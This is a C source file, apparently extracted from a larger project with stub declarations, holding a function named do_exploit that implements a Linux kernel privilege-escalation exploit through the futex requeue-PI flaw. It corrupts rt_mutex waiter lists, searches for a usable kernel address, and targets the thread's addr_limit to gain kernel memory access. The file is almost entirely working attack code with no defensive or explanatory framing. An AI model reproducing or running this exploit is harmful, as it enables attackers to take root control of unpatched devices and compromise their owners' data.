
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_6__ TYPE_3__ ;
typedef struct TYPE_5__ TYPE_2__ ;
typedef struct TYPE_4__ TYPE_1__ ;


typedef int waiter11 ;
struct thread_info {int addr_limit; } ;
struct TYPE_5__ {void* prev; } ;
struct TYPE_4__ {void* next; } ;
struct TYPE_6__ {TYPE_2__ node_list; TYPE_1__ prio_list; } ;
struct rt_mutex_waiter {struct rt_mutex* lock; TYPE_3__ list_entry; } ;
struct rt_mutex {int dummy; } ;
typedef int pthread_t ;
typedef int pid_t ;


 int FUTEX_CMP_REQUEUE_PI ;
 int FUTEX_LOCK_PI ;
 int NODE_LIST_TO_WAITER (void*) ;
 struct rt_mutex_waiter* PRIO_LIST_TO_WAITER (void*) ;
 int SIGNAL_HACK_KERNEL ;
 int __NR_futex ;
 int clientfd ;
 int close (int ) ;
 int create_thread_do_futex_lock_pi_with_priority (int) ;
 scalar_t__ did_socket_tid_read ;
 scalar_t__ do_socket_tid_read ;
 int exit (int ) ;
 int fix_rt_mutex_waiter_list (struct rt_mutex*) ;
 struct thread_info* hack_thread_stack ;
 int hacked ;
 int hacked_lock ;
 int listenfd ;
 int printf (char*,...) ;
 int pthread_cancel_immediately (int ) ;
 int pthread_cond_wait (int *,int *) ;
 int pthread_kill (int ,int ) ;
 int pthread_mutex_lock (int *) ;
 int pthread_mutex_unlock (int *) ;
 int pwaiter11 ;
 int read_pipe (int ,struct rt_mutex_waiter*,int) ;
 int setup_waiter_params (struct rt_mutex_waiter*) ;
 scalar_t__ swag ;
 scalar_t__ swag2 ;
 scalar_t__ sync_with_child_getchar (int ,scalar_t__*,scalar_t__*) ;
 int syscall (int ,scalar_t__*,int ,int,int ,scalar_t__*,scalar_t__) ;
 int thread_client_to_setup_rt_waiter ;
 int usleep (int) ;
 int waiter_thread_tid ;

__attribute__((used)) static bool do_exploit(void *waiter_plist)
{
 void *magicval, *magicval2;
 struct rt_mutex_waiter *rt_waiters;
 pid_t pid;
 pid_t pid6, pid7, pid12, pid11;

 rt_waiters = PRIO_LIST_TO_WAITER(waiter_plist);

 syscall(__NR_futex, &swag2, FUTEX_LOCK_PI, 1, 0, ((void*)0), 0);

 while (syscall(__NR_futex, &swag, FUTEX_CMP_REQUEUE_PI, 1, 0, &swag2, swag) != 1) {
  usleep(10);
 }

 pthread_t th6 = create_thread_do_futex_lock_pi_with_priority(6);
 pthread_t th7 = create_thread_do_futex_lock_pi_with_priority(7);

 swag2 = 0;
 do_socket_tid_read = 0;
 did_socket_tid_read = 0;

 syscall(__NR_futex, &swag2, FUTEX_CMP_REQUEUE_PI, 1, 0, &swag2, swag2);

 if (sync_with_child_getchar(waiter_thread_tid, &do_socket_tid_read, &did_socket_tid_read) < 0) {
 return 0;
 }

 setup_waiter_params(rt_waiters);
 magicval = rt_waiters[0].list_entry.prio_list.next;
 printf("Checking whether exploitable..");
 pthread_t th11 = create_thread_do_futex_lock_pi_with_priority(11);

 if (rt_waiters[0].list_entry.prio_list.next == magicval) {
  printf("failed\n");
  return 0;
 }
 printf("OK\nSeaching good magic...\n");
 magicval = rt_waiters[0].list_entry.prio_list.next;

 pthread_cancel_immediately(th11);

 pthread_t th11_1, th11_2;
 while(1) {
  setup_waiter_params(rt_waiters);
  th11_1 = create_thread_do_futex_lock_pi_with_priority(11);
  magicval = rt_waiters[0].list_entry.prio_list.next;
  hack_thread_stack = (struct thread_info *)((unsigned long)magicval & 0xffffffffffffe000);
  rt_waiters[1].list_entry.node_list.prev = (void *)&hack_thread_stack->addr_limit;

  th11_2 = create_thread_do_futex_lock_pi_with_priority(11);
  magicval2 = rt_waiters[1].list_entry.node_list.prev;

  printf("magic1=%p magic2=%p\n", magicval, magicval2);
  if(magicval < magicval2) {
   printf("Good magic found\nHacking...\n");
   break;
  } else {
   pthread_cancel_immediately(th11_1);
   pthread_cancel_immediately(th11_2);
  }
 }
 pwaiter11 = NODE_LIST_TO_WAITER(magicval2);
 pthread_mutex_lock(&hacked_lock);
 pthread_kill(th11_1, SIGNAL_HACK_KERNEL);
 pthread_cond_wait(&hacked, &hacked_lock);
 pthread_mutex_unlock(&hacked_lock);
 close(listenfd);

 struct rt_mutex_waiter waiter11;
 struct rt_mutex *pmutex;
 int len = read_pipe(pwaiter11, &waiter11, sizeof(waiter11));
 if(len != sizeof(waiter11)) {
  pmutex = ((void*)0);
 } else {
  pmutex = waiter11.lock;
 }
 fix_rt_mutex_waiter_list(pmutex);

 pthread_cancel_immediately(th11_1);
 pthread_cancel_immediately(th11_2);

 pthread_cancel_immediately(th7);
 pthread_cancel_immediately(th6);
 close(clientfd);
 pthread_cancel_immediately(thread_client_to_setup_rt_waiter);

 exit(0);
}
